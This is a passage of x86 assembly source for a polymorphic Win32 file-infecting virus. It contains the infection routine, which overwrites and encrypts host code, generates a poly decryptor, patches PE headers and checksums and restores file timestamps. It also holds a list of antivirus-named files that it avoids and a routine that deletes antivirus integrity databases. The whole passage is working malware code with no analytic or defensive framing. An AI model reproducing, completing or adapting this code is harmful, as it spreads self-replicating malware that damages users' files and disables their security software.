       add eax, virussize			   ;н
       mov [ebp+jumper], eax			   ;нsave this value
						   ;н
       mov esi, [ebp+codesection]		   ;нfill more...
       mov eax, [esi.SH_VirtualAddress] 	   ;н
       add eax, [ebp+randomincr]		   ;н
       mov dword ptr [ebp+@8+1], eax		   ;н
						   ;н
       mov eax, [ebp+eip]			   ;нfill the jump
       mov dword ptr [ebp+@9+1], eax		   ;н
						   ;н
       lea esi, [ebp+relocating_code]		   ;нnow move also the
       mov ecx, relo_code_size			   ;нrelocating code
       rep movsb				   ;н
						   ;н
       pusha					   ;нnow let's encrypt the
       mov edi, [ebx.SH_PointerToRawData]	   ;нoriginal code plus the
       add edi, [ebx.SH_VirtualSize]		   ;нrelocating code which
       add edi, [ebp+mapaddress]		   ;нare now at the end of
       mov eax, 0FFFFFFFEh			   ;нthe last section. The
       call brandom32				   ;нencryption is multi-
       mov dword ptr [ebp+key], eax		   ;нiterative with sliding
       mov eax, 0FFFFFFFEh			   ;нkey, fixed key, fixed
       call brandom32				   ;нoperation. Max 100h
       mov dword ptr [ebp+increment], eax	   ;нiterations multiplied
       mov eax, 50h				   ;нby around 500h gives
       call brandom32				   ;нthe total number of
       add eax, 50h				   ;нloops.
       mov eax, 1				   ;н
       mov [ebp+iterations], eax		   ;н
						   ;н
       mov eax, [ebp+key]			   ;нget key
       mov esi, [ebp+increment] 		   ;нget key increment
       mov ecx, incrsize/4			   ;нsize of code
       mov ebx, [ebp+iterations]		   ;нnumber of iterations
       push edi 				   ;нsave edi
						   ;н
encrypt_loop:					   ;н
       mov edx, [edi]				   ;нget dword
       rol edx, 1				   ;н
       xor edx, esi				   ;н
       sub edx, eax				   ;н
       sub eax, esi				   ;н
       mov [edi], edx				   ;нand store
       add edi, 4				   ;нgo to next dword
       loop encrypt_loop			   ;нloop until end
       dec ebx					   ;нdecrement iterations
       jz ready_				   ;н
       mov eax, [ebp+key]			   ;н
       mov ecx, incrsize/4			   ;нredo all...
       pop edi					   ;н
       push edi 				   ;н
       jmp encrypt_loop 			   ;н
						   ;н
ready_: 					   ;н
       pop edi					   ;н
       popa					   ;н
						   ;н
       mov esi, [ebp+codesection]		   ;нand now move the virus
       mov edi, [esi.SH_PointerToRawData]	   ;нbody over the original
       add edi, [ebp+randomincr]		   ;н
       lea esi, [ebp+start]			   ;нcode section.
       add edi, [ebp+mapaddress]		   ;н
       push edi 				   ;н
       mov ecx, virussize			   ;н
       rep movsb				   ;н
						   ;н
       mov eax, [ebp+codesection]		   ;нstore the new EIP
       mov eax, [eax.SH_VirtualAddress] 	   ;н
       add eax, [ebp+randomincr]		   ;н
       mov [ebp+neweip], eax			   ;н
       add eax, @12-start-1			   ;нand fill in the image
       pop edx					   ;нbase getter
       add edx, (@12-start)+1			   ;н
       mov dword ptr [edx], eax 		   ;н
						   ;н
       mov eax, [ebp+codesection]		   ;нnow fill the jump
       mov edx, [eax.SH_PointerToRawData]	   ;нto the host
       add edx, [ebp+mapaddress]		   ;н
       add edx, [ebp+randomincr]		   ;н
       add edx, @11-start+1			   ;н
       mov eax, [ebp+jumper]			   ;н
       mov dword ptr [edx], eax 		   ;н
						   ;н
       pusha					   ;нnow do the level 2
       mov ecx, 100h				   ;нencryption
						   ;н
encrypt_iteration:				   ;н
       mov edx, 'DEAD'+'MEAT'			   ;н
       mov esi, [ebp+codesection]		   ;н
       mov edi, [esi.SH_PointerToRawData]	   ;н
       add edi, (decrypt_level_2 - start)	   ;н
       add edi, [ebp+randomincr]		   ;н
       add edi, [ebp+mapaddress]		   ;н
       mov esi, edi				   ;н
       mov ebx, (end-decrypt_level_2)/4 	   ;н
						   ;н
encrypt_routine:				   ;н
       lodsd					   ;н
						   ;н
       add eax, edx				   ;н
       sub eax, 'THUN'+'DERP'+'ICK'		   ;н
       ror eax, 16				   ;н
       xor eax, 'LORD'+'JULU'+'S'		   ;н
       rol eax, 16				   ;н
       add edx, 'KICK'+'ASS!'			   ;н
						   ;н
       stosd					   ;н
       dec ebx					   ;н
       jnz encrypt_routine			   ;н
       loop encrypt_iteration			   ;н
       popa					   ;н
						   ;н
       add [ebx.SH_VirtualSize], incrsize	   ;нincrease Virtual Size
						   ;нof last section
       mov eax, [ebx.SH_SizeOfRawData]		   ;нincrease Size of raw
       add eax, incrsize			   ;нdata and align it
       mov ecx, [ebp+filealign] 		   ;н
       xor edx, edx				   ;н
       div ecx					   ;н
       inc eax					   ;н
       mul ecx					   ;н
       mov [ebx.SH_SizeOfRawData], eax		   ;н
						   ;н
       or [ebx.SH_Characteristics], 0C0000000h	   ;нmake it R/W
						   ;н
       mov eax, [ebx.SH_PointerToRawData]	   ;нnow calculate the new
       add eax, [ebx.SH_VirtualSize]		   ;нfile size
       mov edi, eax				   ;н
       mov ecx, [ebp+filealign] 		   ;н
       xor edx, edx				   ;н
       div ecx					   ;н
       inc eax					   ;н
       mul ecx					   ;н
       mov [ebp+filesize], eax			   ;н
						   ;н
       mov ecx, eax				   ;нzero the rest
       sub ecx, edi				   ;н
       add edi, [ebp+mapaddress]		   ;н
       xor eax, eax				   ;н
       rep stosb				   ;н
						   ;н
       pusha					   ;нprepare to call the
       mov eax, [ebp+codesection]		   ;нpoly engine
       mov eax, [eax.SH_VirtualAddress] 	   ;н
       add eax, [ebp+randomincr]		   ;н
       add eax, poly_code_start-start		   ;н
       mov ebx, eax				   ;н
						   ;н
       mov edi, [ebp+codesection]		   ;н
       mov edi, [edi.SH_PointerToRawData]	   ;н
       add edi, [ebp+mapaddress]		   ;н
       add edi, [ebp+randomincr]		   ;н
       add edi, poly_code_start-start		   ;н
						   ;н
       mov esi, edi				   ;н
       sub esi, poly_code_start-start		   ;н
       add esi, poly_decryptor-start		   ;н
						   ;н
       mov ecx, end-poly_code_start		   ;н
						   ;н
       call create_poly 			   ;нmake the poly decr.
						   ;н
       popa					   ;н
						   ;н
       mov eax, [ebp+sizeofimage]		   ;нnow calculate the new
       add eax, incrsize			   ;нsize of image
       mov ecx, [ebp+sectionalign]		   ;н
       xor edx, edx				   ;н
       div ecx					   ;н
       inc eax					   ;н
       mul ecx					   ;н
						   ;н
       mov esi, [ebp+optionalheader]		   ;н
       mov [esi.OH_SizeOfImage], eax		   ;нstore it!
						   ;н
       mov eax, [ebp+neweip]			   ;нstore the new EIP
       mov [esi.OH_AddressOfEntryPoint], eax	   ;н
						   ;н
       cmp [esi.OH_CheckSum], 0 		   ;нis the checksum null?
       je no_checksum				   ;н
						   ;н
       call @21 				   ;н
       db 'Imagehlp.DLL', 0			   ;н
@21:   call [ebp+_LoadLibraryA] 		   ;н
       or eax, eax				   ;н
       jz no_checksum				   ;н
						   ;н
       call @20 				   ;нhere we try to retrieve
       db 'CheckSumMappedFile', 0		   ;нthe checksum API
@20:   push eax 				   ;нif we fail it means we
       call [ebp+_GetProcAddress]		   ;нwe don't have this api
       or eax, eax				   ;н
       jz no_checksum				   ;н
						   ;н
       call @22 				   ;нcompute the new
chksum dd 0					   ;нchecksum...
@22:   call @23 				   ;н
       dd 0					   ;н
@23:   push [ebp+filesize]			   ;н
       push [ebp+mapaddress]			   ;н
       call eax 				   ;н
						   ;н
       mov eax, [ebp+chksum]			   ;н
       mov [esi.OH_CheckSum], eax		   ;нand fill it up...
						   ;н
no_checksum:					   ;н
       mov ebx, [ebp+codesection]		   ;нmake code section R/W
       or [ebx.SH_Characteristics], 0C0000000h	   ;н
						   ;н
       mov [ebp+flag], 1			   ;нmark good infection
						   ;н
unmap_view:					   ;н
       push [ebp+mapaddress]			   ;нunmap the file
       call [ebp+_UnmapViewOfFile]		   ;н
						   ;н
close_map:					   ;н
       push [ebp+maphandle]			   ;нclose the map
       call [ebp+_CloseHandle]			   ;н
						   ;н
close_file:					   ;н
       push FILE_BEGIN				   ;нset the file pointer
       push 0					   ;нto the filesize
       push [ebp+filesize]			   ;н
       push [ebp+filehandle]			   ;н
       call [ebp+_SetFilePointer]		   ;н
						   ;н
       push [ebp+filehandle]			   ;нset the end of file
       call [ebp+_SetEndOfFile] 		   ;н
						   ;н
       lea ebx, [ebp+filetime]			   ;нrestore the file time
       push ebx 				   ;н
       add ebx, 8				   ;н
       push ebx 				   ;н
       add ebx, 8				   ;н
       push ebx 				   ;н
       push [ebp+filehandle]			   ;н
       call [ebp+_SetFileTime]			   ;н
						   ;н
       push [ebp+filehandle]			   ;нclose the file
       call [ebp+_CloseHandle]			   ;н
						   ;н
quit_infection: 				   ;нrestore the attributes
       pop edi					   ;н
       push [ebp+fileattributes]		   ;н
       push edi 				   ;н
       call [ebp+_SetFileAttributes]		   ;н
       popa					   ;н
       cmp [ebp+flag], 1			   ;н
       je do_clc				   ;н
       stc					   ;нbad infection
       ret					   ;н
						   ;н
do_clc: 					   ;н
       clc					   ;нgood infection
       ret					   ;нreturn
filetime       dq 0, 0, 0			   ;н
filesize       dd 0				   ;н
filehandle     dd 0				   ;н
memsize        dd 0				   ;н
maphandle      dd 0				   ;н
mapaddress     dd 0				   ;н
fileattributes dd 0				   ;н
neweip	       dd 0				   ;н
flag	       db 0				   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
ValidateName:					   ;н
       pushad					   ;н
						   ;н
       lea esi, [ebp+avoid_list]		   ;нpoint avoid list
						   ;н
repeat_check_files:				   ;н
       push esi 				   ;н
       call [ebp+_lstrlen]			   ;нget length of string
       mov ecx, eax				   ;н
						   ;н
       push esi edi				   ;н
       rep cmpsb				   ;нcompare string
       je file_invalid				   ;н
       pop edi esi				   ;н
       add esi, eax				   ;нgo to the next name
       inc esi					   ;н
       cmp byte ptr [esi], 0FFh 		   ;нthe end?
       je file_valid				   ;н
       jmp repeat_check_files			   ;н
						   ;н
file_valid:					   ;н
       clc					   ;нfile can be infected
       popad					   ;н
       ret					   ;н
						   ;н
file_invalid:					   ;н
       pop edi ecx				   ;н
       stc					   ;нfile cannot be infected
       popad					   ;н
       ret					   ;н
						   ;н
avoid_list label				   ;н
	   db 'TB'     ,0			   ;н
	   db 'F-'     ,0			   ;н
	   db 'AW'     ,0			   ;н
	   db 'AV'     ,0			   ;н
	   db 'NAV'    ,0			   ;н
	   db 'PAV'    ,0			   ;н
	   db 'RAV'    ,0			   ;н
	   db 'NVC'    ,0			   ;н
	   db 'FPR'    ,0			   ;н
	   db 'DSS'    ,0			   ;н
	   db 'IBM'    ,0			   ;н
	   db 'INOC'   ,0			   ;н
	   db 'ANTI'   ,0			   ;н
	   db 'SCN'    ,0			   ;н
	   db 'VSAF'   ,0			   ;н
	   db 'VSWP'   ,0			   ;н
	   db 'PANDA'  ,0			   ;н
	   db 'DRWEB'  ,0			   ;н
	   db 'FSAV'   ,0			   ;н
	   db 'SPIDER' ,0			   ;н
	   db 'ADINF'  ,0			   ;н
	   db 'EXPLORER',0			   ;нhmmmm...
	   db 'SONIQUE',0			   ;н
	   db 'SQSTART',0			   ;н
	   db 0FFh				   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
KillAV: 					   ;н
       pushad					   ;н
       lea edi, [ebp+offset searchfiles]	   ;нpoint to Search Record
       lea esi, [ebp+offset av_list]		   ;нpoint av files list
						   ;н
locate_next_av: 				   ;н
       cmp byte ptr [esi], 0FFh 		   ;н
       je av_kill_done				   ;н
       mov eax, esi				   ;н
       cmp byte ptr [eax], 0FFh 		   ;нis this the end?
       je av_kill_done				   ;н
       push edi 				   ;нpush search rec. address
       push eax 				   ;нpush filename address
       call [ebp+_FindFirstFileA]		   ;нfind first match
       cmp eax, 0FFFFFFFFh			   ;нcheck for EAX = -1
       je next_av_file				   ;н
       push eax 				   ;н
       lea ebx, [edi.WFD_cFileName]		   ;нESI = ptr to filename
       push 80h 				   ;н
       push ebx 				   ;н
       call [ebp+_SetFileAttributes]		   ;н
       push ebx 				   ;нpush filename address
       call [ebp+_DeleteFileA]			   ;нdelete file!
						   ;н
       call [ebp+_FindClose]			   ;нclose the find handle
						   ;н
next_av_file:					   ;н
       push edi 				   ;н
       mov edi, esi				   ;н
       mov al, 0				   ;н
       mov ecx, 100				   ;н
       repnz scasb				   ;н
       mov esi, edi				   ;н
       pop edi					   ;н
       jmp locate_next_av			   ;н
						   ;н
av_kill_done:					   ;н
       popad					   ;н
       ret					   ;н
						   ;н
searchfiles WIN32_FIND_DATA <?> 		   ;н
						   ;н
av_list 	 db "AVP.CRC"	  , 0		   ;нthe av files to kill
		 db "IVP.NTZ"	  , 0		   ;н
		 db "Anti-Vir.DAT", 0		   ;н
		 db "CHKList.MS"  , 0		   ;н
		 db "CHKList.CPS" , 0		   ;н
		 db "SmartCHK.MS" , 0		   ;н
		 db "SmartCHK.CPS", 0		   ;н
		 db 0FFh			   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
ReturnToHost:					   ;нHere we return to the
       jmp restore_seh				   ;нhost
						   ;н
ExceptionExit:					   ;нif we had an error we
       mov esp, [esp+8] 			   ;нmust restore the ESP
						   ;н
restore_seh:					   ;н
       pop dword ptr fs:[0]			   ;нand restore the SEH
       add esp, 4				   ;нreturning to the host...
						   ;н
       db 0BDh					   ;нrestore delta handle
delta  dd 0					   ;н
						   ;н
       cmp [ebp+gen1], 1			   ;нis it generation 0?
       je generation0_exit			   ;н
						   ;н
@11:   mov eax, 12345678h			   ;нprepare to jump to
       add eax, [ebp+imagebase] 		   ;нthe relocating code
						   ;н
       mov esi, eax				   ;н
       add esi, (@14-relocating_code)		   ;н
       mov ebx, [ebp+imagebase] 		   ;н
       mov dword ptr [esi+1], ebx		   ;н
						   ;н
       push eax 				   ;нdo it!
       ret					   ;н
						   ;н
generation0_exit:				   ;н
       popa					   ;н
       push 0					   ;н
       call ExitProcess 			   ;н
gen1 dd 0					   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
CheckError proc near				   ;н
       or eax, eax				   ;нsets carry flag if
       jz error_found				   ;нeax = 0 or eax = -1
       cmp eax, -1				   ;н
       jz error_found				   ;н
       clc					   ;н
       ret					   ;н
						   ;н
error_found:					   ;н
       stc					   ;н
       ret					   ;н
CheckError endp 				   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;RoundUp:					   ;нThis routine rounds
;	push edx				   ;нthe value in EAX to
;	xor edx, edx				   ;нthe value in ECX (used
;	div ecx 				   ;нto align section and
;	inc ax					   ;нfile sizes).
;	mul ecx 				   ;н
;	pop edx 				   ;н
;	ret					   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
k32_API_names label				   ;н
	      db "GetModuleHandleA",0		   ;н
	      db "ExitProcess", 0		   ;н
	      db "GlobalAlloc", 0		   ;н
	      db "GlobalFree", 0		   ;н
	      db "GetWindowsDirectoryA", 0	   ;н
	      db "GetSystemDirectoryA", 0	   ;н
	      db "GetCurrentDirectoryA", 0	   ;н
	      db "SetCurrentDirectoryA", 0	   ;н
	      db "FindFirstFileA", 0		   ;н
	      db "FindNextFileA", 0		   ;н
	      db "GetDriveTypeA", 0		   ;н
	      db "CloseHandle", 0		   ;н
	      db "FindClose", 0 		   ;н
	      db "CreateFileA", 0		   ;н
	      db "CreateFileMappingA", 0	   ;н
	      db "MapViewOfFile", 0		   ;н
	      db "UnmapViewOfFile", 0		   ;н
	      db "SetFilePointer", 0		   ;н
	      db "SetEndOfFile", 0		   ;н
	      db "GetFileSize", 0		   ;н
	      db "lstrlen", 0			   ;н
	      db "SetFileTime", 0		   ;н
	      db "GetFileTime", 0		   ;н
	      db "GetProcAddress", 0		   ;н
	      db "FlushViewOfFile", 0		   ;н
	      db "GetLastError", 0		   ;н
	      db "GetSystemTime", 0		   ;н
	      db "GetFileAttributesA", 0	   ;н
	      db "SetFileAttributesA", 0	   ;н
	      db "DeleteFileA", 0		   ;н
	      db "LoadLibraryA", 0		   ;н
	      db "IsBadReadPtr",0		   ;н
	      db 0FFh				   ;н
						   ;н
k32_API_addrs label				   ;н
						   ;н
_GetModuleHandleA		dd 0		   ;н
_ExitProcess			dd 0		   ;н
_GlobalAlloc			dd 0		   ;н
_GlobalFree			dd 0		   ;н
_GetWindowsDirectoryA		dd 0		   ;н
_GetSystemDirectoryA		dd 0		   ;н
_GetCurrentDirectoryA		dd 0		   ;н
_SetCurrentDirectoryA		dd 0		   ;н
_FindFirstFileA 		dd 0		   ;н
_FindNextFileA			dd 0		   ;н
_GetDriveTypeA			dd 0		   ;н
_CloseHandle			dd 0		   ;н
_FindClose			dd 0		   ;н
_CreateFileA			dd 0		   ;н
_CreateFileMappingA		dd 0		   ;н
_MapViewOfFile			dd 0		   ;н
_UnmapViewOfFile		dd 0		   ;н
_SetFilePointer 		dd 0		   ;н
_SetEndOfFile			dd 0		   ;н
_GetFileSize			dd 0		   ;н
_lstrlen			dd 0		   ;н
_SetFileTime			dd 0		   ;н
_GetFileTime			dd 0		   ;н
_GetProcAddress 		dd 0		   ;н
_FlushViewOfFile		dd 0		   ;н
_GetLastError			dd 0		   ;н
_GetSystemTime			dd 0		   ;н
_GetFileAttributesA		dd 0		   ;н
_SetFileAttributes		dd 0		   ;н
_DeleteFileA			dd 0		   ;н
_LoadLibraryA			dd 0		   ;н
_IsBadReadPtr			dd 0		   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
u32_API_names label				   ;н
	      db "MessageBoxA", 0		   ;н
	      db 0FFh				   ;н
						   ;н
u32_API_addrs label				   ;н
						   ;н
_MessageBoxA			dd 0		   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
k32		    dd 0			   ;н
kernel32_name	    db "Kernel32.DLL", 0	   ;н
user32_name	    db "USER32.dll", 0		   ;н
						   ;н
getmodulehandle     db "GetModuleHandleA"	   ;н
getmodulehandlelen  =  $-offset getmodulehandle    ;н
getprocaddress	    db "GetProcAddress", 0	   ;н
getprocaddresslen   =  $-offset getprocaddress	   ;н
key	   dd 0 				   ;н
increment  dd 0 				   ;н
iterations dd 0 				   ;н
jumper	   dd 0 				   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
FindNeededStuff:				   ;н
       lea eax, [ebp+ExceptionExit]		   ;нSetup a SEH frame
       push eax 				   ;н
       push dword ptr fs:[0]			   ;н
       mov fs:[0], esp				   ;н
						   ;н
       mov eax, [esp+28h]			   ;нfirst let's locate the
       lea edx, [ebp+kernel32_name]		   ;нkernel32 base address
       call LocateKernel32			   ;н
       jc ReturnToHost				   ;н
       mov dword ptr [ebp+k32], eax		   ;нsave it...
						   ;н
       lea edx, dword ptr [ebp+getprocaddress]	   ;нthen let's locate
       call LocateGetProcAddress		   ;нGetProcAddress
       jc ReturnToHost				   ;н
						   ;н
       mov ebx, eax				   ;нnow let's locate all
       mov eax, dword ptr [ebp+k32]		   ;нthe K32 apis we need
       lea edi, dword ptr [ebp+k32_API_names]	   ;нfurthure...
       lea esi, dword ptr [ebp+k32_API_addrs]	   ;н
       call LocateApiAddresses			   ;н
       jc ReturnToHost				   ;н
						   ;н
       lea edi, dword ptr [ebp+user32_name]	   ;нLocate USER32
       call LocateModuleBase			   ;нmodule base
       jc ReturnToHost				   ;н
						   ;н
       lea edi, dword ptr [ebp+u32_API_names]	   ;нand the corresp.
       lea esi, dword ptr [ebp+u32_API_addrs]	   ;нAPI addresses
       call LocateApiAddresses			   ;н
       jc ReturnToHost				   ;н
						   ;н
       jmp FinishedLocatingStuff		   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
Randomize:					   ;н
       push eax 				   ;нinitialize the random
       mov eax, dword ptr [esp] 		   ;нnumber generator
       add dword ptr [ebp+seed], eax		   ;н
       pop eax					   ;н
       ret					   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
random32:					   ;н
       push ecx 				   ;н
       xor ecx, ecx				   ;н
       mov eax, dword ptr [ebp+seed]		   ;н
       mov cx, 33				   ;н
						   ;н
rloop:						   ;н
       add eax, eax				   ;н
       jnc $+4					   ;н
       xor al, 197				   ;н
       loop rloop				   ;н
       mov dword ptr [ebp+seed], eax		   ;н
       pop ecx					   ;н
       ret					   ;н
seed dd 0BFF81234h				   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
brandom32:					   ;н
       push edx 				   ;нthis procedure gets
       push ecx 				   ;нa random value in eax
       mov edx, 0				   ;нbetween 0 and ecx
       push eax 				   ;н
       call random32				   ;н
       pop ecx					   ;н
       div ecx					   ;н
       xchg eax, edx				   ;н
       pop ecx					   ;н
       pop edx					   ;н
       ret					   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
db 'The world is full of kings and queens',10,13   ;н
db 'That blind your eyes and steal your dreams'    ;н
db 10,13					   ;н
db 'It''s HEAVEN and HELL!!!',10,13		   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
relocating_code:				   ;нthis part will restore
@7:    mov esi, 12345678h			   ;нthe original code sec.
@8:    mov edi, 12345678h			   ;нand jump to the orig.
       add edi, [ebp+imagebase] 		   ;нEIP.
       add esi, [ebp+imagebase] 		   ;н
       mov ecx, virussize			   ;н
       rep movsb				   ;н
       popa					   ;нrestore all regs and
@9:    mov eax, 12345678h			   ;н
@14:   add eax, 12345678h			   ;н
       push eax 				   ;н
       nop					   ;н
       ret					   ;н
relo_code_size = $-offset relocating_code	   ;н
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
include get_apis.inc				   ;нget apis routines
end label					   ;нend of virus code
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
virussize = end-start				   ;нvirus size
incrsize  = virussize + relo_code_size + 100h	   ;н
end start					   ;н
end						   ;нend of code
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
